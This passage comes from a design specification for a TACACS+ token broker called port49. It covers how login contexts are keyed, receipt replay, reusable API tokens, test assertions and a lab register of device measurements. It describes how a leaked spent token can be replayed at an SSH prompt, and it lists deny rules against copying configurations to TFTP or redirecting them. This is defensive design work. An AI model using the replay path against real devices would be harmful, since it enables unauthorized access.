`(nas, username, credential_sha256)`; `port` and `rem_addr` are recorded attributes and are
part of no key, on every platform. Ruled 2026-09-20.** Until then the context was keyed
`(nas, port)` and the receipt `(nas, port, username)`, deliberately excluding the username so
that a `$enab{level}$` enable exchange could still resolve (§7).

*What changed and why.* The lab measured `port` at every exchange rather than only at the
authentication START, and the key did not survive it. On no platform in the lab is `port` the
same value at authentication and at authorization: vEOS says `ssh` then `vty4`, the N9Kv says
`0` then the empty string on every command, and both Junos images say the empty string
throughout. The consequences were measured on shipping images, not inferred — vEOS killed
every interactive session that got a vty allocated, telling the operator *"Authorization
denied: port49: this session was not authenticated by port49"* about a session port49 had
just authenticated, and the N9Kv denied every command. `port` also failed to do the one job
the key needed from it: two concurrent vEOS sessions both reported `vty4`, two concurrent
N9Kv sessions both reported `0`, so two operators on one device collided and locked each
other out. The exclusion of the username was bought to serve `$enab{level}$`, which has now been
measured *not* to apply on either platform that has an enable exchange: vEOS and **IOS-XE**, the
platform the spelling is named after, both put the operator's own username on the enable START
with `service=enable` (L3, 2026-09-20). So the thing the exclusion was paid for has not been
observed on any device in this lab.
Evidence: `docs/design/2026-09-20-login-context-key-options.md`, and
`tests/lab/results/L1-arista_eos.md`, `L1-cisco_nxos.md`, `L1-juniper_vsrx.md`,
`L1-juniper_vjunos-router.md`, `L1-cisco_iosxe.md`, `L3-arista_eos.md`, `L3-cisco_iosxe.md`,
`L7-arista_eos.md`, `L7-cisco_nxos.md`.

**One image does not break the key, and it is worth naming rather than leaving to the L1 table.**
Catalyst 8000V 17.13.01a reports the same `port` on every record of a session and a different one
per concurrent session (`tty434`, `tty435`), so `(nas, port)` would have worked there. A key has
to work on every platform and three of the other four break it in three different ways, so this
changes nothing about the ruling — but it is why the argument for it has to be made from the set
of platforms and not from any one of them.

*The accepted cost, stated plainly.* One user's concurrent sessions on one device share a
context. The second login overwrites the first with identical content under a new `ctx_id`,
so nothing is authorized that was not already authorized, but a log reader cannot tell the
two shells apart. No wire field distinguishes them, so this is not fixable by a better key;
§5.6 requires the overwrite to be logged so it is at least visible.

*The receipt's cost is separate, and also accepted.* `port` leaving the receipt key means a
spent token replays for `receipt_ttl` **anywhere on that NAS and across every transport**,
where `port` previously separated them on some platforms and not others. Measured: on vEOS
`port` is `command-api` for eAPI and `ssh` for a login, so those did not share a receipt
before and do now; on the N9Kv both are `0`, so there was never any separation there (L15).
Concretely, a single-use token spent by an automation tool over eAPI — logged by that tool,
captured at a proxy, read out of a CI variable — can be typed at the same device's SSH
password prompt within `receipt_ttl` and is answered PASS `receipt_replayed`, carrying the
`ctx_id` of the automation's context. The narrowing that is lost was a per-platform accident
rather than a design, which is why the cost is accepted; what remains is `receipt_ttl`, now
the only bound on a leaked spent token, and it is the open question this decision already
names.

*A security primitive this removed, worth recording.* Before the re-key, a command
authorization under a name that differed from the context's owner **deleted that context** —
`username_mismatch` denied and invalidated. That required no credential of any kind, so any
device request naming a live operator ended their authorization until they logged in again.
Under `(nas, username)` a stranger's request addresses its own empty slot and touches nothing;
`DeleteContext` has no production caller left in the tree. Dropping that primitive is the
largest security improvement in the change and was not stated anywhere else.

*What stays open.* The `$enab{level}$` username form has not been observed on any device in this
lab — IOS-XE, the platform L3 was waiting on, was measured 2026-09-20 and sends the operator's
own username (`tests/lab/results/L3-cisco_iosxe.md`) — so the
enable path for that form is unchanged in substance and **provisional**: it resolves through
a `(nas, rem_addr)` secondary index that must refuse rather than guess, and `rem_addr` is
measured identical for two concurrent sessions behind one bastion. That index's
**ambiguity refusal needs a reason code that §5.7's table does not yet carry** — the
vocabulary is closed, so the table comes first and plan 2 adds it there before emitting it.
Plan 1 also has **no escalate path at all**: its `redeem` treats an enable START as an
ordinary redemption and so replaces the login context and its `ctx_id`, measured on vEOS
(§5.6, teardown row 1). "Updates `privilege` in place and keeps `ctx_id`" is a requirement on
plan 2, not a description of the tree. Everything the memo lists under §5 "What to measure
next" stays open; its first item, L3 on IOS-XE, was measured on 2026-09-20 and answered that
this platform does **not** send `$enab{level}$`, which removes the expected exposure rather than
the requirement to handle it if some other train does.

One thing plan 2 and plan 4 both gain from that run, and it is not about enable. **IOS-XE refuses
an authorization reply carrying an attribute it does not recognise, even sent as OPTIONAL**: the
session port49 permitted is ended by the device with `% Authorization failed.` (§15, L10;
`tests/lab/results/L10-cisco_iosxe.md`). Whatever attribute set an adapter sends to that platform
has to be a set the image accepts, and when it is not, port49's own log says `permit` while the
operator is locked out — there is no diagnostic on this side at all.

*Reusable tokens for API transports — provisional, gated on L7.* eAPI and
NX-API with basic authentication present the credential on every HTTP request, and the device
runs AAA per request, so a single-use token serves one API call. Those transports carry a large
share of real automation and cannot be designed around. A subject MAY therefore be granted
`reusable: true`, in which case its tokens are valid until TTL rather than for one redemption:
the store operation is match-without-delete, the receipt is unnecessary because a retry is
simply another use, and device binding and username binding are unchanged.

There is no use counter. TTL already bounds exposure, and a counter would add store semantics
for a bound nobody would tune. `reusable` is reported by CI beside `token_ttl`, since a captured
reusable token replays for its remaining TTL from the bound device — an exposure widening of the
same kind as a long TTL, and visible in review for the same reason.

This paragraph used to ask how login context behaves when `port` is constant across API
sessions, and proposed keying API contexts on `(nas, port, rem_addr)`. Both are answered and
the proposal is withdrawn: `port` is constant or empty across *SSH* sessions too, and
`rem_addr` is measured identical for two concurrent sessions, so the candidate discriminated
nothing. Under `(nas, username)` an API transport needs no separate context key at all.

What is still not decided is `receipt_ttl`. Measured on all four images (L15), a client that
presents Basic credentials on a fresh connection each call costs one authentication per unit
of work, and the repeat is permitted out of the **receipt**, not the store — so a script
making forty calls with one single-use token works
until the receipt expires, and the first call after that is a denial with nothing having
changed in the operator's hand. Any argument for or against reusable tokens has to be made
about that boundary. Two things that bound how much the exchange count itself is worth
arguing about are still open: the eAPI `/login` cookie flow and the NX-API `nxapi_auth`
cookie, which are how a real client avoids re-presenting the credential at all, and HTTP
keep-alive (L7, L15 — the per-request figure is an upper bound for the worst-shaped client,
corrected 2026-09-21). (§5.1.1, §15)

**16. Trust domain is assigned by the verifier, never inferred from the credential.** The
design requires humans and machines to be unforgeably distinct, and nothing previously said
what makes a principal one or the other — an OIDC issuer that serves both people and
application registrations would have been read as human by default. port49 configuration now
declares its verifiers in two lists, `identity.humans` and `identity.machines`, each a trust
anchor, an OIDC issuer-and-audience pair, or a cluster JWKS; a principal's domain is the list
its verifier is in. The same issuer may appear in both with different audiences, which is
exactly the client-credentials case. A credential no verifier accepts is refused at mint with
its own reason. Policy identity strings carry the domain in their form so CI can classify at
load. There is no password path for service accounts: an LDAP-authenticated account moves to a
workload certificate, a cluster token, or one OIDC application per service, and its directory
entry may still supply groups through the certificate-to-directory mapping. (§2, design
document §7)

**17. Session refresh is a fresh authentication event, and the certificate-path session is a
held connection.** The ceiling `auth_time + max_session_age` is only a compliance clock if
`auth_time` moves when a human proves identity and never otherwise. An OIDC client with a
refresh token can mint a new ID token silently, and the provider correctly preserves the
original `auth_time`; a broker stamping its own clock instead would measure time since a CLI
command ran. Refresh therefore requests `prompt=login` or a new proof-of-possession challenge,
and `auth_time` is read from the assertion. Separately, "one certificate authentication per
day" and "a hardware-held session" were both claimed and could not both be true unless the
agent's session is the mTLS connection itself — so it is: the key is exercised at handshake,
mints ride the held connection, a reconnect costs one more touch, and no broker-issued session
token exists on that path. The default `max_session_age` is 12h. (§5.6, design document §7)

**18. No subject means everyone; fleet-wide roles attach to scopes.** *Supersedes the
universal subjects `all_humans`, `all_machines`, and `all_principals`.* Under OIDC "all
humans" is the whole identity provider, so the range had to be narrowed to principals who
already hold access — and then a reader of `subject: all_humans` sees *everyone* and is
wrong, which invites overuse. The mechanism is therefore `attached_roles` on a scope, split by
trust domain: every grant that reaches a device in the scope also carries those roles. It adds
commands to devices a principal already reaches and never adds a device; a principal with no
declared grant on a device is refused. Offboarding by `grants remove --subject` then leaves
nothing that can match. CI reports any scope whose attached roles carry a permit. (§5.5)

**19. The blob lives as long as its longest context, and is emitted into the log.** The blob
TTL had been sized to the token TTL while contexts referenced it for the session and replay
needed it for the retention period — three incompatible lifetimes, the shortest of which would
have denied a command three hours into a login on a restarted replica. Live contexts bump the
store TTL; replay reads a `blob` event from the log, so the store owes the auditor nothing and
the blob sits in the same tamper-evident stream as the records that name it. (§5.1.1, §5.7)

**20. Joint policy-and-inventory validation quarantines a device rather than refusing the
bundle.** A sync can introduce a platform that makes a valid policy invalid. Refusing the
bundle would block every inventory change fleet-wide until policy is edited, a bottleneck
created by the safety mechanism; instead the offending device is published quarantined, given
silence rather than FAIL so it falls to local exactly as in an outage, logged with its own
reason, and named in the alarm and the CI report, while the rest of the fleet moves. (§10)

**21. Post-login controls do not reach a session-only platform, and the spec says so.** The
ceiling, revocation, username binding, and the in-session warning all act at the next
authorization request, and Junos never makes one. Rather than claim reach that does not exist,
`explain` states the limit, the adapter renders class `idle-timeout` from `max_session_age` as
the enforced approximation, and revocation records name the contexts they could not reach.
(§5.6)

**22. Session-only projection is bits first, regexes second, chosen per grant, with one
shape refused.** *Provisional on L12.* The generator picks the smallest permission-bit set
covering the composed grant's permits within the level's ceiling, drops a bit where a deny
aligns with it, and emits regexes only for what bits cannot separate: denies beneath a bit,
and permits that dominate a deny under §5.4. A grant narrower than any covering bit renders
as `deny .*` plus one allow alternation, since emitting nothing widens it to the bit. Bits
travel as `user-permissions` per session by default, or as a `local-user-name` template
where a deployment provisions classes. A permit narrower than the bits with a deny beneath
it is refused at load; the `-regexps` family's documented deny-precedence may lift that once
measured. The choice is made from the composed grant, never per role. (§8, §15)

### Deferred, with reasons

Neither of these is an open question about the design. Both are closed for v1 on the
reasoning below.

**Inventory-sourced entity classes.** Defining `@core_uplinks` from interface tags in the
source of truth is better in principle than a regex, because *which* ports are uplinks is a
fact about the network rather than a naming convention. It is deferred because regex classes
cover what command rules actually reference — `@management`, `@loopback`, `@physical`, and
site-specific port ranges — while interface-level sync is a far larger dataset than the
device-level sync in §10: tens of ports per device against 10,000 devices, rather than 10,000
records. Revisit only when a rule proves inexpressible with regex classes, which is a concrete
trigger rather than a guess.

**Projection equivalence.** Which rule shapes render faithfully into a session-only platform's
native model — Junos `allow-commands` and `deny-commands` — cannot be settled on paper. It
requires a device image, a generated attribute pair, and a probe corpus compared against the
device's own view (`show cli authorization`). Decision 22 states the rendering rule and the
one shape it refuses; L12 is the lab work that confirms or narrows both, in sequencing step 5.
The outcome is a per-platform list of shapes CI refuses. Recorded here only so it is not
mistaken for an unresolved design question.

---

## 14. Required test assertions

Beyond those already listed in the design document's §14:

**Matching and precedence**

- **Full-vector matching**: `show bgp summary` does not match `show bgp summary detail`.
- **Case insensitivity**: `SHOW RUN` matches `show run`; `interface MANAGEMENT1` matches
  `@management` defined as `^Management[0-9]+$`; a `(?-i)` regex matches case-sensitively;
  the vector reaching accounting is unaltered.
- **Dominance, permitting**: a permit of `show chassis hardware` (3,3,3) beats a deny of
  `show chassis **` (3,3,0), while `show chassis hardware detail` remains denied.
- **Dominance, denying**: each of these resolves to DENY because no permit dominates —
  `copy **` against `* * /^tftp:/`; `copy * *` against the same deny; `clear bgp **`
  against `* * all`; `interface @physical` against `interface /^Ethernet1$/`.
- **Dominance, buying it back**: `copy running-config @backup_targets` (3,3,2) dominates
  `* * /^tftp:/` (1,1,2) and permits, while `copy running-config *` (3,3,1) does not.
- **Equal tuples do not dominate**, so an equally specific permit and deny resolve to deny.
- **Class and regex are equally ranked**: neither dominates the other at a shared position.
- **Rank lint**: a regex equivalent to `*` or to a literal is flagged at policy load.
- **Order independence**: a policy file with roles, grants, and rules shuffled produces
  byte-identical decisions across the full test corpus.
- **Entity classes**: one rule using `@management` denies `Management1` on EOS, `mgmt0` on
  NX-OS, and `fxp0` on Junos; a rule referencing a class a platform does not define fails at
  load.
- **Pipeline enforcement**: `show run | redirect …` denied under a role permitting `show **`;
  chained stages each evaluated.
- **Abbreviation handling**: on a platform with `expands_abbreviations: false`, an
  abbreviated command either expands correctly or is denied — never silently unmatched.

**Attributes and privilege**

- **Session authorization returns correct attributes per platform**, with mandatory versus
  optional honored. A mandatory attribute a platform cannot parse causes the device to reject
  the session, so it must be caught in the lab.
- **Attribute layering**: platform → role → grant, most specific winning, shadowing reported.
- **255-byte argument limit** enforced at policy load, including generated projection
  attributes.
- **Unknown attributes default to optional.**
- **Privilege composition**: `max` across granted roles over the declared ordering;
  `parent:` resolves transitively; an unresolvable level fails at load.
- **Enable**: all three mechanisms, including the `$enab15$` username path resolving through
  the `(nas, rem_addr)` secondary index, and its refusal when that index is ambiguous.
- **Receipt binds the credential**: the hash is in the key, so a byte-identical
  retransmission replays and a genuinely new login by the same user on the same device finds
  no receipt and redeems normally rather than being rejected `credential_mismatch`. A spent
  token replayed within `receipt_ttl` is honored only for the same
  `(nas, username, credential_sha256)`.
- **CHAP verification**: a candidate set of several unspent tokens resolves to the one that
  produces the matching digest; the atomic removal, not the verification, decides single use,
  and two replicas racing the same token yield exactly one success — **and the loser answers
  PASS from the receipt, never FAIL**, with the same `ctx_id` as the winner (design document
  §8).
- **CHAP re-prompt**: a fresh challenge does not match the receipt and correctly fails rather
  than replaying.
- **Encryption at rest**: a store dump contains no recoverable token; redemption succeeds
  across a key rotation window in which both keys are accepted.
- **`enable: auto` is refused at policy load** on a platform whose `enable_username` is not
  `principal`.
- **Context teardown**: a redemption overwrites; an authentication START with a different
  username invalidates even when rejected; an ASCII login invalidates once the username
  arrives in a CONTINUE; an exec accounting START for the port annotates and never
  invalidates.
- **Context is never created without redemption** — a locally-authenticated session has none
  and is denied.
- **Username binding on the command path**: a request whose username differs from the stored
  one is denied and the context invalidated.
- **Username resolution**: a human principal's device-facing username is derived at mint from
  the directory or the OIDC claim; a machine subject uses its declared `username`; a subject
  with neither fails at policy load.
- **Username uniqueness**: two subjects declaring the same username fail at policy load.
- **Username normalization**: `alice`, `ALICE`, `DOMAIN\alice`, and `alice@corp.example.com`
  all match a canonical `alice`.
- **`rem_addr` binding on enable**: a mismatch is refused and alerted.
- **Recycled line**: a context now routinely outlives its session, since accounting no longer
  deletes it — so the assertion is that it is not inheritable by the next occupant of that
  line through command authorization, through enable under any of the three mechanisms, or
  through a local-fallback login.
- **Idle session survives**: a login quiet for longer than the former five-minute TTL still
  authorizes its next command.

**Decision log**

- **One record per evaluation**, at each of the five decision events, permits included — a corpus
  exercising the matcher produces exactly as many records as decisions.
- **Replay agreement**: every record in the corpus replays against its named blob and
  reproduces the logged verdict and reason.
- **Replay divergence is detected**: a record whose blob is substituted, or whose verdict is
  edited, is reported as divergent rather than silently accepted.
- **Raw arguments survive normalization**: a record's `raw` reproduces the arguments as
  received, including case and any pipe or abbreviation the normalizer rewrote.
- **No credential material**: a log dump over the full corpus — ASCII, PAP, CHAP, and enable
  — contains no token, password, challenge, or response, and `credential_sha256` matches the
  hash bound by the receipt. A `mint` record carries `token_sha256` and never the token; the
  `redeem` record's `token_sha256` matches it.
- **Retransmission logs as one retried decision**, correlated by `credential_sha256`, not as
  two independent decisions.
- **Enable attribution**: an `escalate` record on a `$enab{level}$` platform names the
  principal from login context, never `$enab15$`.
- **Reason codes are closed**: every denial in the corpus carries a reason from the table, and
  the operational reasons are countable separately from policy denials.
- **Blob retention**: a blob referenced by a retained record is not collected.
- **Correlation chain**: one `ctx_id` joins the mint's redemption, the session, every command,
  any escalation, and every resolved accounting record for that login.

**Device accounting**

- **Record types**: START, WATCHDOG, and STOP each parse and emit; an empty `cmd` is
  recognized as an exec record and a populated one as a command record.
- **`<cr>` stripping**: a record terminated with `cmd-arg=<cr>` normalizes to the same vector
  as the authorization request for the same command, and the join matches. `raw` retains it.
- **Redaction**: `username bob secret Hunter2` emits with the secret removed, in both `raw`
  and `vector`, with the vector's length unchanged so the join still matches. A corpus of
  credential-bearing commands per platform emits no plaintext secret.
- **Durability**: `SUCCESS` follows a durable spool write; a full or unwritable spool returns
  `ERROR` and nothing else does; spool depth and drop count are exported as metrics.
- **Accounting never enforces**: an unreachable sink denies no command, and no code path
  gates an authorization reply on an accounting write.
- **Accounting never deletes context**: the late-STOP sequence in §5.6 leaves the new
  occupant's context intact and authorizing.
- **`task_id` binding**: an exec START binds `task_id`; a STOP bearing a different `task_id`
  does not annotate; a STOP matching it sets `accounting_state: closing`; with no bound
  `task_id`, a username match is required.
- **Foreign session detection**: an exec START whose username differs from the bound one is
  reported as a session port49 did not authenticate.
- **Unattributed records** are recorded rather than discarded, carry `ctx_id: null`, and are
  counted separately.

**Session lifetime and revocation**

- **Credential expiry does not bound the session**: a login authorized by an OIDC token with a
  five-minute `exp` still authorizes commands an hour later.
- **Mint requires validity**: an expired certificate or token is refused at mint.
- **Ceiling warning**: an authorization REPLY inside the warning window carries `server_msg`,
  and the message is confirmed displayed per platform in the lab matrix.
- **In-place refresh**: `port49 login` during the warning window extends `session_expires`
  without a reconnect, and the next command authorizes.
- **Refresh re-resolves policy**: a principal whose grant was withdrawn cannot extend a
  session into continued access.
- **Grace window**: a command past the ceiling is denied with `session_expired` while context
  is retained; a re-auth inside the grace window resumes the same session; past it, context is
  gone and the reason becomes `context_missing`.
- **`max_session_age: never`** is accepted and produces no ceiling.
- **Revocation reaches live sessions on command-authorizing platforms**: a back-channel
  logout naming `sid`, a `sub`-wide revocation, and a certificate appearing on a CRL each
  invalidate the matching contexts and no others, and the next command on each is denied.
- **Revocation does not reach a session-only platform, and says so**: the same events against
  a live Junos login leave the device session running, the revocation record names that
  context as unreached, and `explain` reports the limit for that platform.
- **Blob lifetime follows the context**: a command three hours into a login, on a replica that
  has restarted since redemption, resolves the blob; a `blob` event exists in the log for every
  hash any record names.
- **Quarantine**: a sync introducing a device whose platform fails joint validation publishes
  the bundle with that device quarantined, the rest of the sync applies, a connection from
  the device is closed without a reply and logged `device_quarantined`, the device falls to
  its local method in the lab, and the next sync after the named fix admits it.
- **Unencrypted flag**: a packet with `TAC_PLUS_UNENCRYPTED_FLAG` set is refused before its
  body is parsed and lands in its own report bucket.
- **Fall-through on FAIL** is asserted absent per platform under the reference AAA
  configuration (§15, L4).
- **Context encryption at rest**: a store dump contains no recoverable subject DN, `sub`
  claim, or principal name.

**Platform and projection**

- **Projection equivalence**: generated attributes produce the same decisions on a real device
  as port49's own evaluation, across a probe corpus covering every rule shape the generator
  can emit. Verified through `show cli authorization` where available and `?` completion
  where not. CI refuses shapes that cannot be proven equivalent.
- **Projection precedence**: the four-row matrix in §8 reproduces — a permit regex beats a
  deny regex from either origin, and a deny applies cleanly where no permit regex covers the
  command.
- **Projection generator constraints**: duplicate attribute names, an over-length argument,
  `allow-commands` with `allow-commands-regexps`, and a permit broader than its grant are each
  rejected at policy load rather than emitted.
- **Projection shape selection**: a readonly grant denying `show configuration **` renders
  as `view` without `view-configuration` and no deny regex; a grant whose composed permits
  are narrower than any covering bit renders as `deny .*` plus one allow alternation and the
  device's effective set is exactly the permits (`read_only_limited` on Junos reaches three
  commands, not all of `view`); a grant never receives a bit outside its level's `privilege:`
  ceiling; the mixed shape is refused at load naming the grant, both rules, and the platform.
  A session-only platform without `bits:` is a load error.
- **Wire-to-class escalation**: a role whose deny set exceeds the wire budget is reported by
  CI as requiring a class baseline, and is never silently truncated.
- **Class overflow is reported with its remedy**: a role whose deny set exceeds the wire budget
  produces a CI report naming the role and the class snippet that would carry it;
  `port49 platform export` renders the reference class per level.
- **Platform layering**: user files merge per top-level key; `replace: true` discards the
  built-in; `based_on:` inherits.
- **`platform_set` pinning**: changing the binary without moving the pin produces
  byte-identical rendered attributes.

**Inventory and capability**

- **Snapshot refresh**: atomic swap; in-flight connections complete against the prior
  snapshot; a malformed, empty, or over-shrinking snapshot is rejected and the previous one
  retained.
- **Snapshot never expires**: a daemon with a stale snapshot and an unreachable inventory
  service continues authenticating, alarming on age.
- **Cold start**: a daemon with no snapshot stays unready while existing replicas keep
  serving; a daemon restarted with the inventory service down starts from its persisted
  bundle, and one scheduled onto a fresh node starts from the shared object-store copy.
- **Unresolvable `key_ref`** fails that device closed, not the daemon.

**Key rotation**

- **Try-and-validate**: a request obfuscated with any accepted version is admitted; one
  obfuscated with a retired or unknown key is refused, and over a large random-key corpus no
  wrong key validates.
- **The reply uses the validating key**, not `current` — a device on the older version can
  complete a full authentication and authorization exchange.
- **Per-connection caching**: a CONTINUE on an established connection performs no further key
  candidates.
- **No cutover**: with two versions accepted, devices on either work simultaneously, and
  moving one device does not disturb another.
- **Phase-out visibility**: `keys status` counts devices per version and names the ones still
  presenting an old version.
- **Unvalidated sources are attributed**: a device presenting a retired version is named and
  diagnosed as such; one presenting unknown material reports `no known key matches`; an
  unadmitted source and a non-TACACS+ packet each land in their own bucket rather than in the
  key report.
- **A retired version never admits**: a request obfuscated with a retired key is refused and
  no reply is constructed from it, while still being identified in the report. With diagnostic
  retention disabled, the same request is refused and reports `no known key matches`.
- **Cross-group probing is manual only**: no code path tests another key group's material on
  validation failure; `keys diagnose` does, and names the group that matched.
- **Attempt accounting**: repeated failures from one source are counted, rate-limited with
  backoff, and never cause the daemon to log the obfuscated body.
- **Retirement**: past `retire_after` the version is refused; an empty `accept` set for an
  assigned `key_ref` fails CI; an already-passed `retire_after` and a version with none at all
  are both reported.
- **Encryption-at-rest rotation**: values written under the previous key still decrypt during
  the window, and redemption succeeds across it.
- **Inventory sync safety**: a sync removing more than the configured share is refused and
  the previous snapshot retained.
- **Address collision**: a snapshot binding one address to two devices is refused with both
  named; one device holding several addresses is accepted and all resolve to it.
- **Key group determinism**: a device matched by an explicit pin, an attribute group, and two
  CIDR groups resolves to the pin; removing it resolves to the attribute group, then to the
  longer prefix; two groups matching in the same tier fail at policy load naming both.
- **Attached roles**: `subject: all_humans`, `all_machines`, `all_principals`, and `everyone`
  each fail at policy load as undefined subjects; a scope's `attached_roles.humans` composes
  into a human's grant and not a workload's, and `machines` the reverse; a principal with no
  declared grant selecting the device is refused `no_grants_matched` regardless of attached
  roles; a subject whose grants were all removed collects nothing; a scope whose attached
  roles carry a permit is reported by CI while a deny-only one is not.
- **API rights**: a principal without `api:` can revoke its own tokens and not another's;
  `revoke_others` unlocks exactly that; `/v1/logout` succeeds with a valid logout token and no
  caller rights; every subject carrying `api:` appears in the CI report.
- **Staleness ceiling**: with the broker unreachable, a context authorizes until
  `staleness_ceiling` elapses since `refreshed_at`, then denies `context_stale` with a
  `server_msg`, and resumes on the first refresh after the broker returns.
- **Revocation is distinguishable**: a revoked context's next command is denied
  `credential_revoked`, not `context_missing`, until the idle TTL reclaims it.
- **Device tag**: a token minted for device A presented on device B under PAP or ASCII is
  refused `device_mismatch` without a store read; the same under CHAP is `token_not_found`;
  the tag is a keyed hash and two devices never share one.
- **Config-mode inference**: a device with config-command authorization disabled is detected
  and reported.
- **Accounting reconciliation**: commands present in accounting with no authorization request
  are reported as an unauthorized tier.
- **Unknown platform** falls back to generic and alarms; **unknown device** is refused.

**Scoping**

- **State-scoped mitigation**: a device leaving `srx_unpatched` on the next sync regains the
  denied command with no policy change.
- **`on_missing`**: a device lacking the scoped attribute is included for a deny-bearing
  scope and excluded for a permit-bearing one.

---

## 15. Lab register

Some of what this document says about devices has been measured and some has not. The two
are not the same kind of statement, and a spec that lets them read alike will eventually be
implemented against a guess. This section is the one place the distinction is kept.

**The rules:**

1. Every claim about device or protocol behavior that a design decision rests on is an entry
   here, with an ID. The rest of the document cites the ID and does not restate the claim as
   fact.
2. A decision in §13 that depends on an open entry is **provisional**, and says so.
3. An entry closes with a platform, an image version, the observation, and a pointer to the
   capture — a file under `tests/lab/` in this repository, or a results note. Closing on
   documentation alone is not closing.

   The capture a note points at is in `tests/lab/evidence/`, and it is committed. The raw
   capture in `tests/lab/captures/` is not, and never will be: it holds the lab tokens and
   the breakglass password, in the clear for anyone who applies the key this repository
   publishes. An evidence file is that capture with the credential bytes overwritten with
   `x` and every other byte left alone — same packets, same lengths, same sequence numbers,
   and it decodes in Wireshark under the same key. `tests/lab/README.md` has the details and
   `tests/lab/cmd/redact-pcap` does the work. A pointer into `tests/lab/captures/` does not
   close a row, because nobody but the machine that ran the lab can follow it.
4. The containerlab step of the implementation plan *is* this table. Lab work is not listed
   anywhere else.
5. An entry may close differently per platform. A row with one platform measured and three
   open is still open.

| ID | Claim to measure | What rests on it | Platforms | Status |
|---|---|---|---|---|
| **L1** | What the `port` field contains, per platform **and per transport** — SSH, console, eAPI, NX-API, NETCONF. Whether it is unique per concurrent session and stable for its life. | The login context key (§5.1.1, §5.6) — this row is what re-cut it to `(nas, username)` on 2026-09-20, and `port` is now a recorded attribute rather than part of any key (§13, decision 15); reusable-token API sessions (§13, decision 15) | EOS, NX-OS, IOS-XE, Junos | open — SSH measured on EOS, Junos and NX-OS, and on **no platform is `port` the same value at authentication and at authorization**; eAPI, NX-API and NETCONF measured on EOS and NX-OS; IOS-XE and the console unmeasured; see below |
| **L2** | Whether `server_msg` on an authorization REPLY is displayed to the operator, and at what length it truncates. | The session-ceiling warning (§5.6); denial messages | all | open — displayed in full on EOS; **not measurable on the N9Kv today**, because every command is denied before the authorizer runs (L1); truncation length and IOS-XE unmeasured; see below |
| **L3** | Whether the enable START carries `rem_addr`, and what it contains — bare address, or address and source port. | `rem_addr` binding on `$enab{level}$` platforms (§5.6); the login context key, because an enable that carries a fixed username collapses `(nas, username)` to one context per device | EOS, NX-OS, IOS-XE | open — reopened 2026-09-21, closed in error the day before. Measured: vEOS 4.32.2F and IOS-XE 17.13.01a both send the operator's own username with `service=enable` and a bare-address `rem_addr` (`tests/lab/results/L3-arista_eos.md`, `L3-cisco_iosxe.md`). **NX-OS re-measured 2026-09-21 with the transcript it was missing** (`tests/lab/results/L3-nxos-cisco_nxos.md`): `disable`, `enable` and `enable 15` were each typed separately and each answered `% Invalid command at '^' marker.`, and `feature privilege` is itself refused by this image, so the conclusion the reopened note reached without evidence is confirmed with it |
| **L4** | Whether any method-list configuration falls through to local on FAIL rather than only on ERROR — specifically Junos `authentication-order` with `password` listed — and `deadtime` behavior. | The `enable: auto` exposure argument and "denial is FAIL, so no fall-through" (§5.6); the reference AAA configuration | Junos first; then all | open — measured 2026-09-20 on vJunos-router, vSRX, vEOS and the N9Kv over SSH: both Junos images fall through on a FAIL when `password` is listed; vEOS and the N9Kv never do; `deadtime`, IOS-XE, other transports and authorization fall-through unmeasured; see below |
| **L5** | Which platforms send accounting WATCHDOG, how often, and with or without arguments. | §5.8 record handling | all | closed — measured 2026-09-20; `tests/lab/results/L5-arista_eos.md`, `L5-juniper_vjunos-router.md`, `L5-juniper_vsrx.md`, `L5-cisco_nxos.md`, `L5-cisco_iosxe.md`. No image sends a WATCHDOG over a 2m30s idle interactive session under the lab's accounting config, which sets no periodic update; a device configured for periodic updates is outside what was measured |
| **L6** | How reliably and how late exec accounting START and STOP arrive, and whether a device retries accounting to the same server or fails to the next. | The `task_id` binding tolerance (§5.8); what reconciliation may conclude from silence (§9); `ERROR` semantics | all | open — arrival and latency measured on EOS and Junos; retry unmeasured; see below |
| **L7** | Whether eAPI and NX-API run each HTTP request through AAA authentication, whether session cookies (`/login`) change that, and whether API commands produce per-command authorization requests. | Reusable tokens (§13, decision 15); capability inference (§9) | EOS, NX-OS | open — eAPI and NX-API both measured 2026-09-20: one authentication per HTTP request on both, with per-command authorization and per-command accounting. The `/login` cookie flow, which this row also names, is still unmeasured, and it is the only clause left open; see below |
| **L8** | The maximum password length each platform accepts at an interactive prompt and via PAP. | The 30-character handle (design document §8) | all | open — interactive prompt measured on EOS and Junos; PAP unmeasured; see below |
| **L9** | Whether Junos anchors `allow-commands` / `deny-commands` regexes, and which RE2 constructs its regex dialect rejects. | Projection generator constraints (§8) | Junos | open |
| **L10** | Whether `service` arrives as `shell` or `junos-exec`, and the exact spelling of every attribute in a shipped adapter. | Adapter `VERIFIED` status (§8) | all shipped adapters | open — `shell` on EOS, `junos-exec` on Junos; see below |
| **L11** | Junos precedence, repetition, and length behavior for wire and class rules. | The projection model (§8) | Junos (SRX) | **closed** — measured 2026-09-03; results in `port49-junos-lab-tests-results.md` |
| **L12** | `user-permissions` over TACACS+: accepted with a bitless template, replaces rather than merges with the class, per-session. What each bit reaches, so `bits:` can be declared. Whether a wire `deny-commands .*` plus one allow alternation yields exactly the permits. Whether `deny-commands-regexps` beats `allow-commands-regexps` over the wire as documented, and whether numbered names (`allow-commands1`, `allow-commands2`) are distinct attributes. | The projection rule, its default shape, and its refused shape (§8; §13, decision 22) | Junos (vSRX / vJunos-router in containerlab) | open — `user-permissions` and class bits are in production use; no capture yet |
| **L13** | How long a device waits for a TACACS+ reply, and what it does when a FAIL arrives after that — reports an authentication failure, or treats the server as unreachable and falls through to the next method or the next server. | port49 delays a FAIL on purpose: `limits.auth_failure_delay_base` doubling to `limits.auth_failure_delay_max`, **default 500ms and 2s**, which is the "answered with increasing delay" of design document §11. The ceiling was 5s until this row measured device reply timeouts; **2026-09-21 it was lowered to 2s**, which is under every timeout measured here, so a FAIL is always delivered inside it (`tests/lab/results/L13-*.md`). A ceiling above a device's timeout turns a denial into silence, and silence is the fall-through condition of §5.6 and L4. | all | open — measured 2026-09-20 over SSH on vJunos-router, vSRX, vEOS, N9Kv and Catalyst 8000V: about 3s on both Junos images, 5.0s on vEOS, about 6s on the N9Kv, which also retransmits, and above 12s on IOS-XE, which this sweep does not bound from above; past that timeout every platform that reached it takes the fall-through branch; other transports and the next-server case unmeasured; see below |
